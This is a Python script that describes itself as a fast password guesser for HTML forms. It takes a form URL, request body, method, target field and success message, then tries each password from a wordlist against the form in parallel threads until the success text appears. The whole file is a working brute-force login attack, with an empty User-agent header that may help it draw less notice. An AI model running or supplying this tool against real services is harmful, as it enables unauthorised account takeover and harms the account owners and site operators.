import argparse, threading, queue, requests
from urllib.parse import urljoin, parse_qsl

argparse = argparse.ArgumentParser(description="A fast password guesser for HTML forms")
argparse.add_argument("-u", "--url", help="Enter the url of form action")
argparse.add_argument(
    "-d",
    "--data",
    help="Enter the exact query string(in case of GET) and body data (in case of POST)",
)
argparse.add_argument("-m", "--method", help="Enter the form method (GET/POST)")
argparse.add_argument("-f", "--field", help="Enter the key name to be brute forced")
argparse.add_argument(
    "-s", "--success", help="Enter the unique message in case of successful login"
)
argparse.add_argument("-t", "--threads", help="Enter the number of threads to run")

args = argparse.parse_args()
url = args.url
data = args.data
method = args.method
success_message = args.success
threads = int(args.threads)
field = args.field

s = requests.Session()
s.headers["User-agent"] = ""
if method == "POST":
    s.headers["Content-type"] = "application/x-www-form-urlencoded"
try:
    requests.get(url)
except:
    print("[-] Could not connect to the url..")
    exit()

guessed = False
correct_password = ""


def http_guesser():
    global guessed, correct_password
    while not guessed and not q.empty():
        curr_pass = q.get()
        try:
            print(f"[:] Trying.. {curr_pass}")
            pairs = data.split("&")

            for j in range(len(pairs)):
                if field in pairs[j]:
                    field_array = [field, curr_pass]
                    pairs[j] = "=".join(field_array)

            data_new = "&".join(pairs)
            res = s.request(method, url, data=data_new, timeout=3)
            if success_message in res.content.decode().lower():
                print(f"[+] Success message triggered on : {curr_pass}")
                correct_password = curr_pass
                guessed = True

        except:
            pass

        q.task_done()


q = queue.Queue()

with open("wordlists/password_list", "r") as file:
    for password in file.read().splitlines():
        q.put(password)

threadsl = []
for i in range(threads):
    t = threading.Thread(target=http_guesser, daemon=True)
    t.start()
    threadsl.append(t)

for t in threadsl:
    t.join()

if guessed:
    print(f"[+] Password found : {correct_password}")
else:
    print("[-] Password not found..")
